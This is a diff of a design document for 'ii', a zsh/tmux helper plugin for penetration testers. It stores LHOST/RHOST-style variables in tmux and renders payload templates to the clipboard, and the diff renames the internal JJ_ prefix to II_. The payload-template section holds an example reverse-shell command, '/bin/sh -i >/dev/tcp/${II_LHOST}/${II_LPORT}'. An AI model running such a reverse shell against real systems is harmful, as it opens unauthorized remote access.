@@ -35,7 +35,7 @@ The primary constraints:
 - Copy behavior must not break inside tmux or on payloads with special chars.
 - The codebase should be plugin-first and split by responsibility layers.
 - Kali deployment should work by installing the generated `export/ii` directory.
-- Bundled payloads should work without requiring users to export JJ_PAYLOAD_DIR.
+- Bundled payloads should work without requiring users to export II_PAYLOAD_DIR.
 ```
 
 ## State Model
@@ -43,16 +43,16 @@ The primary constraints:
 There are two separate variable states:
 
 ```text
-tmux session environment = source of truth shared by all panes, internally JJ_ prefixed
-current shell environment = local state for the current pane, without JJ_ prefix
+tmux session environment = source of truth shared by all panes, internally II_ prefixed
+current shell environment = local state for the current pane, without II_ prefix
 ```
 
 Command behavior follows this model:
 
 ```text
-ii s   writes internal JJ_ names to tmux and unprefixed names to current shell
-ii l   loads tmux session values into current shell without JJ_ prefix
-ii ls  reads non-empty tmux session values and displays them without JJ_ prefix
+ii s   writes internal II_ names to tmux and unprefixed names to current shell
+ii l   loads tmux session values into current shell without II_ prefix
+ii ls  reads non-empty tmux session values and displays them without II_ prefix
 ii i   reads tmux session values, then copies selected variable values
 ii p   reads tmux session values directly while rendering
 ```
@@ -170,13 +170,13 @@ ii s -d
 Behavior:
 
 ```text
-1. Normalize NAME into JJ_NAME.
-   Names are canonicalized to uppercase, so user2 and USER2 both become JJ_USER2.
+1. Normalize NAME into II_NAME.
+   Names are canonicalized to uppercase, so user2 and USER2 both become II_USER2.
 2. Validate the normalized variable name.
-3. Store JJ_NAME=VALUE in the current tmux session environment.
+3. Store II_NAME=VALUE in the current tmux session environment.
 4. Export uppercase and lowercase shell variables into the current shell.
 5. Enable loaded-variable sync for the current shell.
-6. Print NAME=VALUE without the internal JJ_ prefix.
+6. Print NAME=VALUE without the internal II_ prefix.
 ```
 
 Example:
@@ -191,10 +191,10 @@ ii s RPORT 80
 Stored values:
 
 ```text
-JJ_LHOST=192.168.45.192
-JJ_LPORT=443
-JJ_RHOST=192.168.201.175
-JJ_RPORT=80
+II_LHOST=192.168.45.192
+II_LPORT=443
+II_RHOST=192.168.201.175
+II_RPORT=80
 ```
 
 User-facing shell values:
@@ -221,9 +221,9 @@ ii l
 Behavior:
 
 ```text
-1. Read all JJ_ variables from the current tmux session.
+1. Read all II_ variables from the current tmux session.
 2. Validate each variable name before export.
-3. Export each variable into the current shell without the JJ_ prefix.
+3. Export each variable into the current shell without the II_ prefix.
    Both uppercase and lowercase shell names are exported.
 4. Do not export default variable names that have not been assigned values.
 5. Enable loaded-variable sync for the current shell.
@@ -254,7 +254,7 @@ ii i
 Behavior:
 
 ```text
-1. Read configured JJ_ variables from tmux.
+1. Read configured II_ variables from tmux.
 2. Merge them with default variable names.
 3. Present names in fzf with a single-line value preview.
 4. Show the selected variable value in a bottom preview pane.
@@ -282,7 +282,7 @@ This command is a variable copy/add layer, not a shell loading layer. Use
 Behavior:
 
 ```text
-1. Read all JJ_ variables from tmux.
+1. Read all II_ variables from tmux.
 2. Skip empty values.
 3. If PATTERN is omitted, print every non-empty variable.
 4. If PATTERN is present, filter by key name only, case-insensitively.
@@ -341,7 +341,7 @@ Behavior:
 4. Let fzf handle fuzzy search and selection with rendered payload preview.
    The selector list includes a single-line rendered preview.
 5. Resolve the selected entry to a payload file.
-6. Render the template with fresh tmux JJ_ values.
+6. Render the template with fresh tmux II_ values.
    Missing or empty values render as lowercase shell fallbacks like $rhost.
 7. Copy the rendered payload.
 8. Print the rendered payload.
@@ -363,7 +363,7 @@ sqli     sqli/*
 xss      xss/*
 ```
 
-`script/*` is for custom script snippets. Files can use `${JJ_NAME}`
+`script/*` is for custom script snippets. Files can use `${II_NAME}`
 placeholders, or literal shell variables such as `$rhost`. If no renderable
 placeholder is present, the selected script text is copied literally.
 
@@ -404,7 +404,7 @@ ctrl-q  quit
 Behavior:
 
 ```text
-1. Normalize each NAME into JJ_NAME.
+1. Normalize each NAME into II_NAME.
 2. Remove the variable from the current tmux session.
 3. Unset the variable in the current shell.
 4. Print each unset variable.
@@ -415,9 +415,9 @@ Behavior:
 Behavior:
 
 ```text
-1. Prompt before deleting all JJ_ variables in the current tmux session.
+1. Prompt before deleting all II_ variables in the current tmux session.
 2. Continue only when the answer is exactly y.
-3. Remove every JJ_ variable from the current tmux session.
+3. Remove every II_ variable from the current tmux session.
 4. Unset matching uppercase and lowercase shell variables.
 5. Print the number of removed variables.
 ```
@@ -482,15 +482,15 @@ Payload templates are plain text files.
 Preferred placeholder form:
 
 ```text
-${JJ_LHOST}
-${JJ_LPORT}
-${JJ_DOMAIN}
+${II_LHOST}
+${II_LPORT}
+${II_DOMAIN}
 ```
 
 Example:
 
 ```text
-/bin/sh -i >/dev/tcp/${JJ_LHOST}/${JJ_LPORT} 2>&1 0>&1
+/bin/sh -i >/dev/tcp/${II_LHOST}/${II_LPORT} 2>&1 0>&1
 ```
 
 ## Payload Render Layer
@@ -501,7 +501,7 @@ Input:
 
 ```text
 selected payload file
-current tmux session JJ_ variables
+current tmux session II_ variables
 ```
 
 Output:
@@ -517,8 +517,8 @@ Required behavior:
 1. Read the selected payload file as plain text.
    A first-line `# description:` metadata line is not part of the render body.
 2. Read tmux session environment at render time.
-3. Replace `${JJ_NAME}` placeholders with tmux values.
-4. Support bare `JJ_NAME` replacement for compatibility.
+3. Replace `${II_NAME}` placeholders with tmux values.
+4. Support bare `II_NAME` replacement for compatibility.
 5. Render missing or empty tmux values as lowercase shell fallbacks like `$rhost`.
 6. Report every variable required by the template, using shell fallback text for
    missing or empty values.
@@ -553,7 +553,7 @@ Responsibilities:
 
 ```text
 ii i:
-  - Input: default variable names plus JJ_ variable lines from tmux.
+  - Input: default variable names plus II_ variable lines from tmux.
   - UI: fzf with --multi.
   - Display: variable name, single-line value preview, and red "more" marker
     when the full value is longer than the displayed preview.
@@ -590,12 +590,12 @@ ii_var_normalize_name:
   - Strip leading "export ".
   - Strip anything after "=".
   - Uppercase the name.
-  - Add JJ_ prefix when missing.
-  - Validate against JJ_[A-Z_][A-Z0-9_]*.
+  - Add II_ prefix when missing.
+  - Validate against II_[A-Z_][A-Z0-9_]*.
 
 ii_var_lines_from_tmux:
   - Read tmux show-environment.
-  - Return only JJ_ assignments.
+  - Return only II_ assignments.
 
 ii_export_var_line:
   - Validate NAME before export.
@@ -608,11 +608,11 @@ ii_enable_loaded_var_sync:
     rewrite lowercase names are corrected before the next command.
 
 ii_var_display_lines_for_fzf:
-  - Convert JJ_LHOST=... to LHOST=... for TUI display.
+  - Convert II_LHOST=... to LHOST=... for TUI display.
   - Do not change tmux storage format.
 
 ii_var_line_from_display:
-  - Convert selected LHOST=... back to JJ_LHOST=... before export.
+  - Convert selected LHOST=... back to II_LHOST=... before export.
 ```
 
 Do not export arbitrary tmux environment lines.
@@ -625,8 +625,8 @@ quotes, shell metacharacters, newlines, and other special characters.
 Current strategy:
 
 ```text
-1. If JJ_CLIP_BACKEND is set, use that named backend.
-2. If JJ_CLIP_CMD is set, pipe rendered payload to that command.
+1. If II_CLIP_BACKEND is set, use that named backend.
+2. If II_CLIP_CMD is set, pipe rendered payload to that command.
 3. Otherwise prefer OSC52 inside tmux or SSH when base64 is available.
 4. Otherwise auto-detect clip.exe, wl-copy, xclip, xsel, pbcopy.
 5. If no clipboard tool is found inside tmux, pipe to tmux load-buffer -.
@@ -648,7 +648,7 @@ Kali over SSH or tmux deployment uses OSC52 by default when possible. To force
 OSC52 explicitly, set:
 
 ```zsh
-export JJ_CLIP_BACKEND=osc52
+export II_CLIP_BACKEND=osc52
 ```
 
 Do not require X server or Wayland clipboard packages for this workflow.
@@ -667,7 +667,7 @@ This is safer for special characters and less likely to break inside tmux.
 ```
 
 If OSC52 is unsupported by the terminal, users can override the backend with
-`JJ_CLIP_CMD` or `JJ_CLIP_BACKEND`.
+`II_CLIP_CMD` or `II_CLIP_BACKEND`.
 
 ## Plugin Architecture
 
@@ -682,11 +682,11 @@ ii.plugin.zsh
 Plugin-level settings:
 
 ```text
-JJ_PLUGIN_DIR   defaults to the plugin root directory
-JJ_PAYLOAD_DIR  defaults to ${JJ_PLUGIN_DIR}/payloads unless already set
+II_PLUGIN_DIR   defaults to the plugin root directory
+II_PAYLOAD_DIR  defaults to ${II_PLUGIN_DIR}/payloads unless already set
 ```
 
-Users only need to set `JJ_PAYLOAD_DIR` when they want an external payload
+Users only need to set `II_PAYLOAD_DIR` when they want an external payload
 library.
 
 Layer files:
@@ -757,7 +757,7 @@ Implemented:
 
 ```text
 - plugin entrypoint: ii.plugin.zsh
-- plugin-provided default JJ_PLUGIN_DIR and JJ_PAYLOAD_DIR
+- plugin-provided default II_PLUGIN_DIR and II_PAYLOAD_DIR
 - layered lib/ structure
 - ii dispatcher with short subcommands: s, l, i, v, p, h
 - tmux session variable source of truth
